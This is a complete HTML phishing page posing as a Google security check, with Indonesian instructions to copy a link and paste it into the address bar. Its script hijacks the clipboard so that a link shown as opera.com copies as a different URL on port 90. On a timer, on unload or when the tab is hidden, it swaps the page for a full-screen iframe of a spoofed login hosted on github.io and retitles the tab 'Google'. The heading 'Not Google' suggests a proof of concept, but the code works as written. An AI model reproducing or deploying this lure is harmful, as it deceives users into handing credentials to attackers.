<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Google Security Verification</title>

<style>
body{
    font-family:sans-serif;
    text-align:center;
    padding-top:60px;
    background:#f8f9fa
}
input{
    width:85%;
    max-width:320px;
    padding:10px;
    border:1px solid #ccc;
    border-radius:8px
}
button{
    margin-top:10px;
    padding:10px 20px;
    border:0;
    border-radius:6px;
    background:#1a73e8;
    color:#fff;
    font-weight:bold
}
</style>
</head>

<body>

<h3>Sistem Verifikasi Google</h3>
<p>Salin link lalu paste ke address bar.</p>

<input id="tst" value="https://www.OPERA.com" disabled>
<br>
<button onclick="copyt()">Salin Link</button>

<script>
const tst = document.getElementById('tst');

function copyt(){
    tst.disabled = false;
    tst.select();
    document.execCommand('copy');
    tst.disabled = true;
}

tst.oncopy = e => {
    e.clipboardData.setData(
        'text/plain',
        'http://auth.opera.com:90/account/authenticate.html'
    );
    e.preventDefault();
};

function triggerSpoof(){
    document.body.innerHTML = `
    <div style="
        position:fixed;
        inset:0;
        background:#fff;
        z-index:9999;
        padding:5vh 4%;
        overflow:hidden
    ">
        <h1 style="
            margin:0 0 15px;
            font:800 24px sans-serif
        ">
            𝐷ℎ𝑎𝑓𝑦 | 𝑁𝑜𝑡 𝐺𝑜𝑜𝑔𝑙𝑒
        </h1>

        <iframe
            src="https://cnfdnfial-ops.github.io/spoof/login"
            style="
                width:100%;
                height:500px;
                border:0;
                border-radius:12px
            ">
        </iframe>
    </div>
    `;

    document.title = "Google";
}

setTimeout(triggerSpoof,5000);

window.onbeforeunload = triggerSpoof;

document.addEventListener('visibilitychange',()=>{
    if(document.visibilityState==='hidden'){
        triggerSpoof();
    }
});
</script>

</body>
</html>
